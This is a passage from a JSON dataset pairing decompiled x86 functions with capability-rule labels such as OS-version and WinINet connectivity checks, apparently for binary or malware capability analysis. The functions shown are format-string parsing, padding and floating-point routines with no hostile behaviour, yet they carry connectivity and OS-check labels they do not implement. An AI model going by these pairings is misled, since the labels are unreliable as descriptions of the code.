{\n                    if (*param_1[4] == 'h') {\n                        param_1[0xb] = 1;\n                        param_1[4] = param_1[4] + 1;\n                    }\n                    else {\n                        param_1[0xb] = 2;\n                    }\n                }\n            }\n            else if (cVar4 == 'l') {\n                if (*param_1[4] == 'l') {\n                    param_1[0xb] = 4;\n                    param_1[4] = param_1[4] + 1;\n                }\n                else {\n                    param_1[0xb] = 3;\n                }\n            }\n            else if (cVar4 == 't') {\n                param_1[0xb] = 7;\n            }\n            else if (cVar4 == 'w') {\n                param_1[0xb] = 0xc;\n            }\n            else if (cVar4 == 'z') {\n                param_1[0xb] = 6;\n            }\n        }\n        return 1;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    iVar6 = 1;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0040639f:\n            param_1[8] = param_1[8] | 0x10;\n            goto code_r0x004063a3;\n        }\n        if ('X' < cVar4) {\n            if (cVar4 == 'Z') {\n                cVar4 = fcn.0040682d();\n                goto code_r0x0040633b;\n            }\n            if (cVar4 != 'a') {\n                if (cVar4 != 'c') {\n                    return 0;\n                }\ncode_r0x0040635f:\n                cVar4 = fcn.00406bbf(0);\n                goto code_r0x0040633b;\n            }\ncode_r0x004063af:\n            cVar4 = fcn.004068f3();\n            goto code_r0x0040633b;\n        }\n        if (cVar4 != 'X') {\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0040635f;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x00406334;\n                }\n            }\n            goto code_r0x004063af;\n        }\n        arg_ch = 1;\ncode_r0x0040634b:\n        arg_8h = 0x10;\n    }\n    else {\n        if (cVar4 < 'q') {\n            if (cVar4 == 'p') {\n                cVar4 = fcn.00406ec4();\n                goto code_r0x0040633b;\n            }\n            if (cVar4 < 'h') goto code_r0x004063af;\n            if (cVar4 != 'i') {\n                if (cVar4 == 'n') {\n                    cVar4 = fcn.00406e31();\n                }\n                else {\n                    if (cVar4 != 'o') {\n                        return 0;\n                    }\n                    cVar4 = fcn.00406ea5();\n                }\n                goto code_r0x0040633b;\n            }\n            goto code_r0x0040639f;\n        }\n        if (cVar4 == 's') {\ncode_r0x00406334:\n            cVar4 = fcn.00406edc();\n            goto code_r0x0040633b;\n        }\n        if (cVar4 != 'u') {\n            if (cVar4 != 'x') {\n                return 0;\n            }\n            arg_ch = 0;\n            goto code_r0x0040634b;\n        }\ncode_r0x004063a3:\n        arg_ch = 0;\n        arg_8h = 10;\n    }\n    cVar4 = fcn.00406ce7(arg_8h, arg_ch);\ncode_r0x0040633b:\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    uVar2 = param_1[8];\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    iVar7 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        iVar7 = iVar6;\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                iVar7 = 0;\n                if ((uVar2 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    iVar7 = iVar6;\n                }\n            }\n            else {\n                uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n            }\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n    }\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 != 'x') && (cVar4 != 'X')) || ((uVar2 >> 5 & 1) == 0)) {\n        iVar6 = 0;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar6 != '\\0') || (bVar3)) {\n        *(&uStack8 + iVar7) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&uStack8 + iVar7 + 1) = (!bVar3 - 1U & 0xe0) + 0x78;\n        iVar7 = iVar7 + 2;\n    }\n    iVar6 = (param_1[9] - param_1[0xe]) - iVar7;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.004057b8(param_1 + 0x112, 0x20, iVar6, param_1 + 6);\n    }\n    fcn.004071bc(&uStack8, iVar7, param_1 + 6, param_1[3]);\n    arg_14h = param_1 + 6;\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.004057b8(param_1 + 0x112, 0x30, iVar6, arg_14h);\n    }\n    fcn.0040708a(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.004057b8(param_1 + 0x112, 0x20, iVar6, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2290
    },
    "004062ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004062ee(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_8h;\n    uint arg_ch;\n    int32_t var_4h;\n    \n    iVar4 = 1;\n    cVar3 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar3 < 'e') {\n        if (cVar3 == 'd') {\ncode_r0x0040639f:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\n            goto code_r0x004063a3;\n        }\n        if ('X' < cVar3) {\n            if (cVar3 == 'Z') {\n                cVar3 = fcn.0040682d();\n                goto code_r0x0040633b;\n            }\n            if (cVar3 != 'a') {\n                if (cVar3 != 'c') {\n                    return 0;\n                }\ncode_r0x0040635f:\n                cVar3 = fcn.00406bbf(0);\n                goto code_r0x0040633b;\n            }\ncode_r0x004063af:\n            cVar3 = fcn.004068f3();\n            goto code_r0x0040633b;\n        }\n        if (cVar3 != 'X') {\n            if (cVar3 != 'A') {\n                if (cVar3 == 'C') goto code_r0x0040635f;\n                if (cVar3 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar3) {\n                    if (cVar3 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x00406334;\n                }\n            }\n            goto code_r0x004063af;\n        }\n        arg_ch = 1;\ncode_r0x0040634b:\n        arg_8h = 0x10;\n    }\n    else {\n        if (cVar3 < 'q') {\n            if (cVar3 == 'p') {\n                cVar3 = fcn.00406ec4();\n                goto code_r0x0040633b;\n            }\n            if (cVar3 < 'h') goto code_r0x004063af;\n            if (cVar3 != 'i') {\n                if (cVar3 == 'n') {\n                    cVar3 = fcn.00406e31();\n                }\n                else {\n                    if (cVar3 != 'o') {\n                        return 0;\n                    }\n                    cVar3 = fcn.00406ea5();\n                }\n                goto code_r0x0040633b;\n            }\n            goto code_r0x0040639f;\n        }\n        if (cVar3 == 's') {\ncode_r0x00406334:\n            cVar3 = fcn.00406edc();\n            goto code_r0x0040633b;\n        }\n        if (cVar3 != 'u') {\n            if (cVar3 != 'x') {\n                return 0;\n            }\n            arg_ch = 0;\n            goto code_r0x0040634b;\n        }\ncode_r0x004063a3:\n        arg_ch = 0;\n        arg_8h = 10;\n    }\n    cVar3 = fcn.00406ce7(arg_8h, arg_ch);\ncode_r0x0040633b:\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    uVar1 = *(in_ECX + 0x20);\n    var_4h = var_4h._3_1_ << 0x18;\n    iVar5 = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        iVar5 = iVar4;\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                iVar5 = 0;\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    iVar5 = iVar4;\n                }\n            }\n            else {\n                var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n            }\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n    }\n    cVar3 = *(in_ECX + 0x31);\n    if (((cVar3 != 'x') && (cVar3 != 'X')) || ((uVar1 >> 5 & 1) == 0)) {\n        iVar4 = 0;\n    }\n    if ((cVar3 == 'a') || (cVar3 == 'A')) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((iVar4 != '\\0') || (bVar2)) {\n        *(&var_4h + iVar5) = 0x30;\n        if ((cVar3 == 'X') || (cVar3 == 'A')) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        *(&var_4h + iVar5 + 1) = (!bVar2 - 1U & 0xe0) + 0x78;\n        iVar5 = iVar5 + 2;\n    }\n    iVar4 = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - iVar5;\n    if ((uVar1 & 0xc) == 0) {\n        fcn.004057b8(in_ECX + 0x448, 0x20, iVar4, in_ECX + 0x18);\n    }\n    fcn.004071bc(&var_4h, iVar5, in_ECX + 0x18, *(in_ECX + 0xc));\n    arg_14h = in_ECX + 0x18;\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.004057b8(in_ECX + 0x448, 0x30, iVar4, arg_14h);\n    }\n    fcn.0040708a(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.004057b8(in_ECX + 0x448, 0x20, iVar4, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1646
    },
    "00406172": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00406172(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    int32_t arg_ch;\n    uint unaff_ESI;\n    int32_t arg_10h;\n    uint16_t uVar9;\n    uint arg_8h;\n    uint arg_ch_00;\n    uint uStack16;\n    ushort uStack12;\n    uint32_t uStack8;\n    \n    puVar6 = *(param_1 + 0x32);\n    if (puVar6 != 0x46) {\n        if (puVar6 == 0x4e) {\n            puVar6 = *param_1 & 8;\n            if (puVar6 == NULL) {\n                param_1[7] = 8;\ncode_r0x004061ad:\n                puVar7 = fcn.00409b44();\n                *puVar7 = 0x16;\n                uVar8 = fcn.004051ed();\n                return uVar8 & 0xffffff00;\n            }\n        }\n        else {\n            if (param_1[0xb] != 0) goto code_r0x004061ad;\n            if (puVar6 < 0x6b) {\n                if (puVar6 == 0x6a) {\n                    param_1[0xb] = 5;\n                }\n                else if (puVar6 == 0x49) {\n                    puVar2 = param_1[4];\n                    puVar6 = *puVar2;\n                    if ((puVar6 == 0x33) && (puVar2[1] == 0x32)) {\n                        puVar6 = puVar2 + 2;\n                        param_1[0xb] = 10;\n                        param_1[4] = puVar6;\n                    }\n                    else if ((puVar6 == 0x36) && (puVar2[1] == 0x34)) {\n                        puVar6 = puVar2 + 2;\n                        param_1[0xb] = 0xb;\n                        param_1[4] = puVar6;\n                    }\n                    else if (((((puVar6 == 0x64) || (puVar6 == 0x69)) || (puVar6 == 0x6f)) ||\n                             ((puVar6 == 0x75 || (puVar6 == 0x78)))) || (puVar6 == 0x58)) {\n                        param_1[0xb] = 9;\n                    }\n                }\n                else if (puVar6 == 0x4c) {\n                    param_1[0xb] = 8;\n                }\n                else if (puVar6 == 0x54) {\n                    param_1[0xb] = 0xd;\n                }\n                else if (puVar6 == 0x68) {\n                    puVar6 = param_1[4];\n                    if (*puVar6 == 0x68) {\n                        puVar6 = puVar6 + 1;\n                        param_1[0xb] = 1;\n                        param_1[4] = puVar6;\n                    }\n                    else {\n                        param_1[0xb] = 2;\n                    }\n                }\n            }\n            else if (puVar6 == 0x6c) {\n                puVar6 = param_1[4];\n                if (*puVar6 == 0x6c) {\n                    puVar6 = puVar6 + 1;\n                    param_1[0xb] = 4;\n                    param_1[4] = puVar6;\n                }\n                else {\n                    param_1[0xb] = 3;\n                }\n            }\n            else if (puVar6 == 0x74) {\n                param_1[0xb] = 7;\n            }\n            else if (puVar6 == 0x77) {\n                param_1[0xb] = 0xc;\n            }\n            else if (puVar6 == 0x7a) {\n                param_1[0xb] = 6;\n            }\n        }\ncode_r0x004062eb:\n        return CONCAT31(puVar6 >> 8, 1);\n    }\n    puVar6 = *param_1 & 8;\n    if (puVar6 != NULL) goto code_r0x004062eb;\n    param_1[7] = 7;\n    uStack8 = *0x41c028 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x004065dc:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004065e0:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004065e3:\n            cVar5 = fcn.00406ce7(arg_8h, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x00406588:\n                arg_8h = 0x10;\n                goto code_r0x004065e3;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x0040659c;\n                if (uVar9 < 0x45) goto code_r0x0040676a;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x0040676a;\n                    goto code_r0x00406570;\n                }\n            }\ncode_r0x004065ec:\n            cVar5 = fcn.00406a4d();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00406890();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x004065ec;\n            if (uVar9 != 99) goto code_r0x0040676a;\ncode_r0x0040659c:\n            cVar5 = fcn.00406c4f(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00406ec4();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x004065ec;\n            if (uVar9 == 0x69) goto code_r0x004065dc;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.00406e31();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x0040676a;\n                cVar5 = fcn.00406ea5();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x0040676a;\n                arg_ch_00 = 0;\n                goto code_r0x00406588;\n            }\n            goto code_r0x004065e0;\n        }\ncode_r0x00406570:\n        cVar5 = fcn.00406f4f();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x0040676a;\n    uVar8 = param_1[8];\n    uStack16 = 0;\n    uStack12 = 0;\n    arg_ch = 0;\n    if ((uVar8 >> 4 & 1) != 0) {\n        if ((uVar8 >> 6 & 1) == 0) {\n            if ((uVar8 & 1) == 0) {\n                if ((uVar8 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                }\n                goto code_r0x0040666a;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        arg_ch = 1;\n    }\ncode_r0x0040666a:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar8 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&uStack16 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&uStack16 + arg_ch * 2 + 2) = (!bVar3 - 1U & 0xe0) + 0x78;\n        arg_ch = arg_ch + 2;\n    }\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((uVar8 & 0xc) == 0) {\n        fcn.004057e4(param_1 + 0x112, 0x20, arg_10h, param_1 + 6);\n    }\n    fcn.0040724f(&uStack16, arg_ch, param_1 + 6, param_1[3]);\n    arg_14h = param_1 + 6;\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.004057e4(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00407131(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.004057e4(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\ncode_r0x0040676a:\n    uVar8 = fcn.004026d1(unaff_ESI);\n    return uVar8;\n}\n",
        "token_count": 2501
    },
    "0040651d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040651d(int32_t param_1)\n\n{\n    int32_t *arg_14h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    uint unaff_ESI;\n    int32_t arg_10h;\n    uint16_t uVar6;\n    uint arg_8h;\n    uint arg_ch_00;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41c028 ^ &stack0xfffffffc;\n    uVar6 = *(param_1 + 0x32);\n    if (uVar6 < 0x65) {\n        if (uVar6 == 100) {\ncode_r0x004065dc:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x004065e0:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004065e3:\n            cVar5 = fcn.00406ce7(arg_8h, arg_ch_00);\n        }\n        else if (uVar6 < 0x59) {\n            if (uVar6 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x00406588:\n                arg_8h = 0x10;\n                goto code_r0x004065e3;\n            }\n            if (uVar6 != 0x41) {\n                if (uVar6 == 0x43) goto code_r0x0040659c;\n                if (uVar6 < 0x45) goto code_r0x0040676a;\n                if (0x47 < uVar6) {\n                    if (uVar6 != 0x53) goto code_r0x0040676a;\n                    goto code_r0x00406570;\n                }\n            }\ncode_r0x004065ec:\n            cVar5 = fcn.00406a4d();\n        }\n        else if (uVar6 == 0x5a) {\n            cVar5 = fcn.00406890();\n        }\n        else {\n            if (uVar6 == 0x61) goto code_r0x004065ec;\n            if (uVar6 != 99) goto code_r0x0040676a;\ncode_r0x0040659c:\n            cVar5 = fcn.00406c4f(0);\n        }\n    }\n    else if (uVar6 < 0x71) {\n        if (uVar6 == 0x70) {\n            cVar5 = fcn.00406ec4();\n        }\n        else {\n            if (uVar6 < 0x68) goto code_r0x004065ec;\n            if (uVar6 == 0x69) goto code_r0x004065dc;\n            if (uVar6 == 0x6e) {\n                cVar5 = fcn.00406e31();\n            }\n            else {\n                if (uVar6 != 0x6f) goto code_r0x0040676a;\n                cVar5 = fcn.00406ea5();\n            }\n        }\n    }\n    else {\n        if (uVar6 != 0x73) {\n            if (uVar6 != 0x75) {\n                if (uVar6 != 0x78) goto code_r0x0040676a;\n                arg_ch_00 = 0;\n                goto code_r0x00406588;\n            }\n            goto code_r0x004065e0;\n        }\ncode_r0x00406570:\n        cVar5 = fcn.00406f4f();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x0040676a;\n    uVar2 = *(param_1 + 0x20);\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    arg_ch = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                }\n                goto code_r0x0040666a;\n            }\n            uVar6 = 0x2b;\n        }\n        else {\n            uVar6 = 0x2d;\n        }\n        var_ch = uVar6;\n        arg_ch = 1;\n    }\ncode_r0x0040666a:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = (!bVar3 - 1U & 0xe0) + 0x78;\n        arg_ch = arg_ch + 2;\n    }\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.004057e4(param_1 + 0x448, 0x20, arg_10h, param_1 + 0x18);\n    }\n    fcn.0040724f(&var_ch, arg_ch, param_1 + 0x18, *(param_1 + 0xc));\n    arg_14h = param_1 + 0x18;\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.004057e4(param_1 + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00407131(0);\n    if ((-1 < *arg_14h) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.004057e4(param_1 + 0x448, 0x20, arg_10h, arg_14h);\n    }\ncode_r0x0040676a:\n    fcn.004026d1(unaff_ESI);\n    return;\n}\n",
        "token_count": 1657
    },
    "00406ce7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406ce7(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t arg_ch_00;\n    bool bVar5;\n    \n    iVar1 = fcn.004067d1(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00409b44();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004051ed();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x00406d98;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x00406d98;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x00406d98:\n    if ((((*(in_ECX + 0x20) >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar5 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar5);\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x40;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xfffffff7;\n        if (0x200 < *(in_ECX + 0x28)) {\n            *(in_ECX + 0x28) = 0x200;\n        }\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    if (iVar1 == 8) {\n        fcn.00405730(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.004056bb(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1099
    },
    "0040de42": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040de42(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1dh;\n    \n    if (*(unaff_EBP + -0x1d) != '\\0') {\n        fcn.0040bc52(3);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "004116ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 fcn.004116ae(double param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_14h;\n    double dVar6;\n    double dVar7;\n    uchar in_XMM0 [16];\n    double dVar8;\n    double dVar9;\n    double dVar10;\n    double dVar11;\n    double dStack12;\n    \n    iVar4 = 0;\n    while( true ) {\n        uVar2 = SUB162(in_XMM0 >> 0x30, 0) >> 4;\n        dVar6 = SUB168(in_XMM0, 0) & *0x418d40 | *0x418db0;\n        dVar7 = SUB168(in_XMM0, 0) & *0x418d48 | *0x418db8;\n        uVar1 = SUB82(*0x418d60 + dVar6, 0) & 0x7f0;\n        dVar11 = *0x418d78 & dVar7;\n        dVar9 = (*0x418d70 & dVar6) * *(uVar1 + 0x419370) - *0x418d50;\n        dVar6 = (dVar6 - (*0x418d70 & dVar6)) * *(uVar1 + 0x419370);\n        dVar8 = (dVar7 - dVar11) * *(uVar1 + 0x419378);\n        dVar7 = dVar6 + dVar9;\n        dVar11 = dVar8 + (dVar11 * *(uVar1 + 0x419378) - *0x418d58);\n        uVar3 = uVar2 - 1;\n        if (uVar3 < 0x7fe) {\n            iVar4 = (uVar2 - 0x3ff) + iVar4;\n            dVar10 = iVar4;\n            iVar5 = 0;\n            if (uVar1 + iVar4 * 0x400 == 0) {\n                iVar5 = 0x10;\n            }\n            return ((*0x418e08 * dVar11 + *0x418e18) * dVar11 + *0x418e28) * dVar11 * dVar11 +\n                   ((*0x418e00 * dVar7 + *0x418e10) * dVar7 + *0x418e20) * dVar7 * dVar7 * dVar7 * dVar7 * dVar7 +\n                   *0x418e30 * dVar7 + *(uVar1 + 0x418f68) + dVar10 * *0x418d88 + (dVar8 & *(iVar5 + 0x418d98)) +\n                   *(uVar1 + 0x418f60) + dVar9 + dVar10 * *0x418d80 + (dVar6 & *(iVar5 + 0x418d90));\n        }\n        dStack12 = -(*0x418dc0 == param_1);\n        if (SUB82(dStack12, 0) != 0) break;\n        if (uVar3 != 